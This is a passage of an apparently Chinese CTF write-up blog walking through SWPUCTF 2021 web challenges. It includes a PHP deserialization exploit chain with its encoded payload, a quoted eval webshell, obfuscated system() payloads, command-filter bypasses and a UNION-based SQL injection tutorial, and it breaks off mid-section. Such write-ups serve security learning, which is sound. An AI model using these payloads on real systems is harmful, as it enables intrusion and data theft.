<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22System%28%27ls+%2F%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108122127917.png" alt="image-20230108122127917"></p>
<p>然后<code>cat /fllllllaaag </code>即可，最终<code>exp</code></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NISA</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fun</span>=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txw4ever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;fun==<span class="string">&quot;show_me_flag&quot;</span>)&#123;</span><br><span class="line">            <span class="comment">//hint();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$from</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fun=<span class="variable">$val</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;fun;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//checkcheck($this-&gt;txw4ever);</span></span><br><span class="line">        @<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TianXiWei</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext-&gt;nisa(<span class="keyword">$this</span>-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ilovetxw</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$huang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$su</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$fun1</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;huang-&gt;fun=<span class="variable">$arg</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$bb</span> = <span class="keyword">$this</span>-&gt;su;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$bb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">four</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;TXW4EVER&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$fun</span>=<span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fun = <span class="string">&quot;sixsixsix&quot;</span>)&#123;</span><br><span class="line">            strtolower(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//func checkcheck($data)&#123;</span></span><br><span class="line"><span class="comment">//  if(preg_match(......))&#123;</span></span><br><span class="line"><span class="comment">//      die(something wrong);</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//function hint()&#123;</span></span><br><span class="line"><span class="comment">//    echo &quot;.......&quot;;</span></span><br><span class="line"><span class="comment">//    die();</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span> = <span class="keyword">new</span> TianXiWei();</span><br><span class="line"><span class="variable">$IlovetxwObj</span> = <span class="keyword">new</span> Ilovetxw();</span><br><span class="line"></span><br><span class="line"><span class="variable">$TianXiWeiObj</span>-&gt;ext = <span class="variable">$IlovetxwObj</span>;  <span class="comment">//$this-&gt;ext-&gt;nisa($this-&gt;x);调用到Ilovetxw-&gt;__call();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span> = <span class="keyword">new</span> four();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;huang = <span class="variable">$fourObj</span>; <span class="comment">//$this-&gt;huang-&gt;fun=$arg[0];调用到four-&gt;__set();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$fourObj</span>-&gt;a = <span class="variable">$IlovetxwObj</span>;<span class="comment">//strtolower($this-&gt;a);调用到$IlovetxwObj.__toString();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span> = <span class="keyword">new</span> NISA();</span><br><span class="line"><span class="variable">$IlovetxwObj</span>-&gt;su = <span class="variable">$NISAObj</span>;<span class="comment">// $bb = $this-&gt;su;return $bb();调用到NISA.__invoke();</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$NISAObj</span>-&gt;txw4ever = <span class="string">&quot;System(&#x27;cat /fllllllaaag&#x27;);&quot;</span>;<span class="comment">//@eval($this-&gt;txw4ever);调用到system(&quot;ipconfig&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myString</span> = serialize(<span class="variable">$TianXiWeiObj</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$myString</span>);</span><br><span class="line"><span class="comment">//unserialize($myString); //调用TianXiWei.__invoke();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3Br%3A2%3Bs%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3Bs%3A5%3A%22aaaaa%22%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22System%28%27cat+%2Ffllllllaaag%27%29%3B%22%3B%7D%7Ds%3A1%3A%22x%22%3BN%3B%7D</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-easyupload1-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h1>
      <p>检测文件头，改一下就行了，<code>flag</code>在<code>phpinfo</code>里面</p>

        <h1 id="SWPUCTF-2021-新生赛-easyupload2-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload2-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload2.0"></a>[SWPUCTF 2021 新生赛]easyupload2.0</h1>
      <p>检测后缀和文件头</p>

        <h1 id="SWPUCTF-2021-新生赛-easyupload3-0"   >
          <a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1>
      <p>可以上传<code>.htaccess</code>来将<code>png</code>作为<code>php</code></p>

        <h1 id="SWPUCTF-2021-新生赛-caidao"   >
          <a href="#SWPUCTF-2021-新生赛-caidao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h1>
      <p>加载了一张图片，但是一般来说，如果只加载图片，并不会能连接的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109200923250.png" alt="image-20230109200923250"></p>
<p>但是用蚁剑连上，才发现<code>index.php</code>里面有</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo(&#x27;&lt;html&gt;&lt;head&gt;&lt;style&gt;body&#123;background:url(caidao.png) top left;background-size:100%;&#125;&lt;/style&gt;&lt;/head&gt;&lt;/html&gt;&#x27;);</span><br><span class="line">@eval($_POST[&#x27;wllm&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-easyrce"   >
          <a href="#SWPUCTF-2021-新生赛-easyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h1>
      <p>普通的<code>shell</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201242190.png" alt="image-20230109201242190"></p>

        <h1 id="SWPUCTF-2021-新生赛-babyrce"   >
          <a href="#SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]babyrce"></a>[SWPUCTF 2021 新生赛]babyrce</h1>
      <p>提示如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201720863.png" alt="image-20230109201720863"></p>
<p>用<code>burpsuite</code>给<code>COOKIE</code>添加一下<code>admin</code>字段为1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201814743.png" alt="image-20230109201814743"></p>
<p>访问<code>rasalghul.php</code>，直接命令执行，过滤空格，用<code>$&#123;IFS&#125;</code>代替空格即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201940275.png" alt="image-20230109201940275"></p>

        <h1 id="SWPUCTF-2021-新生赛-hardrce"   >
          <a href="#SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h1>
      <p>命令执行，但是过滤了很多东西</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205721004.png" alt="image-20230109205721004"></p>
<p>但是由于是<code>php7</code>，所以可以利用取反来执行命令，参考<code>p神</code>的：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" >一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" >无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205707061.png" alt="image-20230109205707061"></p>
<p>主要结论如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205850748.png" alt="image-20230109205850748"></p>
<p>即用<code>python</code>稍微写一下就行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210209173.png" alt="image-20230109210209173"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">93</span>%<span class="number">8</span>c%df%d0);<span class="comment">//system(&#x27;ls /&#x27;)</span></span><br></pre></td></tr></table></div></figure>

<p>知道<code>flag</code>名字了</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210301490.png" alt="image-20230109210301490"></p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%<span class="number">8</span>c%<span class="number">86</span>%<span class="number">8</span>c%<span class="number">8</span>b%<span class="number">9</span>a%<span class="number">92</span>)(~%<span class="number">9</span>c%<span class="number">9</span>e%<span class="number">8</span>b%df%d0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">93</span>%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">9</span>e%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>%<span class="number">98</span>);<span class="comment">//system(&#x27;cat /flllllaaaaaaggggggg&#x27;)</span></span><br></pre></td></tr></table></div></figure>


        <h1 id="SWPUCTF-2021-新生赛-finalrce"   >
          <a href="#SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110140811427.png" alt="image-20230110140811427"></p>
<p><code>exec</code>直接执行命令，但是过滤了很多东西，包括<code>ls</code>也过滤了，但是命令行中有比较特殊符号反引号以及<code>\</code>，这个常用来连接命令，可以看到如下例子，其实是差不多的。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141330808.png" alt="image-20230110141330808"></p>
<p>所以这里可以用<code>l\s</code>来进行绕过，其他命令也是类似。</p>
<p>那么就差一个回显了，由于重定向符号<code>&gt;</code>也被禁止了，那么这里可以用到<code>tee</code>命令，该命令可以通过管道符<code>|</code>将前一个命令的执行结果写入到文件中，效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141934420.png" alt="image-20230110141934420"></p>
<p>那么就可以通过该命令来将需要命令结果写入到文件中，然后访问文件即可访问到命令结果。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=l\s%20/%20|%20tee%201.txt</span><br></pre></td></tr></table></div></figure>

<p>对应访问</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110142057595.png" alt="image-20230110142057595"></p>
<p>同样道理获取<code>flag</code>，但是这里还过滤了<code>la</code>，所以同样道理，给<code>flllllaaaaaaggggggg</code>的对应<code>la</code>处加上<code>\</code>符号也是一样的。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=c\at%20/flllll\aaaaaaggggggg%20|%20tee%202.txt</span><br></pre></td></tr></table></div></figure>

<p>访问<code>2.txt</code>即可得到<code>flag</code></p>

        <h1 id="SWPUCTF-2021-新生赛-easy-sql"   >
          <a href="#SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h1>
      <p>参数是<code>wllm</code>，几个<code>sql</code>注入常见考点</p>

        <h2 id="前置知识"   >
          <a href="#前置知识" class="heading-link"><i class="fas fa-link"></i></a><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2>
      <p>同样的，对应<code>sql</code>语句也会有注释，常用的注释有下</p>
<ul>
<li><code>#</code>：但是在<code>url</code>中该符号有特殊意义，所以使用的时候需要改成编码<code>%23</code>才行</li>
<li><code>--</code>：用的时候通常需要为<code>--空格 </code>形式才能正常解析，而在<code>sql</code>中<code>+</code>和<code>--</code>连用时作用和空格类似，所以<code>--+</code>成为常见的<code>sql</code>注入语句，当然<code>--%20</code>也是一样的。</li>
</ul>
<p>所以这里先使用单引号<code>&#39;</code>将之闭合，然后语句最后使用<code>--+</code>来将后面的多余语句进行注释，比如原语句是</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> ... </span><br></pre></td></tr></table></div></figure>

<p>用户输入为<code>1&#39; order by 1--+</code>，那么结果即为</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...<span class="keyword">where</span> wllm <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">--+&#x27; and ... </span></span><br></pre></td></tr></table></div></figure>

<p>原本的<code>&#39; and ... </code>这个就不会执行了，而<code>order by 1</code>会顺利执行，完成相关的<code>sql</code>语句注入查询。</p>

        <h2 id="1-判断类型"   >
          <a href="#1-判断类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-判断类型" class="headerlink" title="1.判断类型"></a>1.判断类型</h2>
      <p>首先需要判断注入类型，常见的有字符，数字，时间，布尔等。</p>
<p>输入<code>wllm=1</code>正常回显，但是输入<code>wllm=1&#39;</code>会显示错误，代表引号匹配不对，表明是字符型的注入。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-字段数查询"   >
          <a href="#2-字段数查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-字段数查询" class="headerlink" title="2.字段数查询"></a>2.字段数查询</h2>
      <p>需要知道该表有几个字段，才能进行后续的回显点查询，这里可以用到<code>order by</code>来进行查询。</p>
<p><code>order by </code>的意思就是依据输入的字段来进行排序，这里既可以输入字段名字，也可以输入字段序号，比如下表</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173717231.png" alt="image-20230110173717231"></p>
<p>输入<code>order by games_played</code>和输入<code>order by 4</code>其效果是一样的，但是如果输入<code>order by 5</code>，而该表又只有4个字段，那么就会出错，如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173850560.png" alt="image-20230110173850560"></p>
<p>可以通过这个方法来判断有几个字段，这里输入<code>order by 4</code>回显错误，表明字段数为3。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175556882.png" alt="image-20230110175556882"></p>

        <h2 id="3-回显点查询"   >
          <a href="#3-回显点查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-回显点查询" class="headerlink" title="3.回显点查询"></a>3.回显点查询</h2>
      <p>可以看到输入<code>wllm=1</code>是正常回显的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173359149.png" alt="image-20230110173359149"></p>
<p>而<code>xxx</code>和<code>yyy</code>就是可能存在的回显点，那么需要判断这个回显点是在那个字段，这里就可以使用常见的<code>select 1,2,3</code>这种了。</p>

        <h3 id="select-1-2-3"   >
          <a href="#select-1-2-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#select-1-2-3" class="headerlink" title="select 1,2,3"></a>select 1,2,3</h3>
      <p>直接查询情况如下，可以看到，相当于直接创建了一个与<code>1,2,3</code>有关的表，字段数为输入的数字个数，即3个，对应数据也能理解</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175654372.png" alt="image-20230110175654372"></p>
<p>而当和联合查询<code>union select</code>相结合使用的时候，就需要输入的这些字段数和另一个表的字段数一样才会正常查询</p>
<p>比如某个表如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180052010.png" alt="image-20230110180052010"></p>
<p>联合查询语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180123723.png" alt="image-20230110180123723"></p>
<p>相当于把两个表进行合并，而如果字段数不一致，就会出错，比如减去一个字段数</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> activity <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180254544.png" alt="image-20230110180254544"></p>
<p>可以看到查询字段数不一致的错误，这里也就是为什么之前需要判断表有几个字段的原因。</p>

        <h3 id="结合查询"   >
          <a href="#结合查询" class="heading-link"><i class="fas fa-link"></i></a><a href="#结合查询" class="headerlink" title="结合查询"></a>结合查询</h3>
      <p>把前一张表置空，也就是<code>where wllm=xx</code>，<code>xx</code>不存在的时候，前一张表查出来自然就是空的。</p>
<p>然后再联合查询<code>select 1,2,3...</code>，依据返回数据，判断回显点在哪个字段</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180737312.png" alt="image-20230110180737312"></p>
<p>即可知道回显的数据在第2，3两个字段，那么就依据这两个字段，进行相关数据查询，这里就从第2个字段入手。</p>

        <h2 id="4-查询库名"   >
          <a href="#4-查询库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-查询库名" class="headerlink" title="4.查询库名"></a>4.查询库名</h2>
      <p>利用<code>database()</code>函数来查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,database(),3--+</span></span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181009012.png" alt="image-20230110181009012"></p>
<p>库名为<code>test_db</code></p>

        <h2 id="5-查询表名"   >
          <a href="#5-查询表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-查询表名" class="headerlink" title="5.查询表名"></a>5.查询表名</h2>
      <p>利用<code>group_concat()</code>函数来查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wllm<span class="operator">=</span>xx<span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></div></figure>

<p>可以看到，这里想要提供库的名字<code>test_db</code>，所以之前需要查询到库名。</p>
<p>这里也有一点前置知识，也就是<code>information_schema</code>是<code>mysql</code>中的一个信息数据库，保存着关于<code>MySQL</code>服务器所维护的所有其他数据库的信息。比如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_38972910/article/details/86012110" >(48条消息) mysql自带的information_schema.tables是什么？_你的小伙伴啊的博客-CSDN博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>那么即可查询到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181442257.png" alt="image-20230110181442257"></p>
<p>可以看到存在两个表为<code>test_tb</code>和<code>users</code></p>

        <h2 id="6-查询字段名"   >
          <a href="#6-查询字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-查询字段名" class="headerlink" title="6.查询字段名"></a>6.查询字段名</h2>
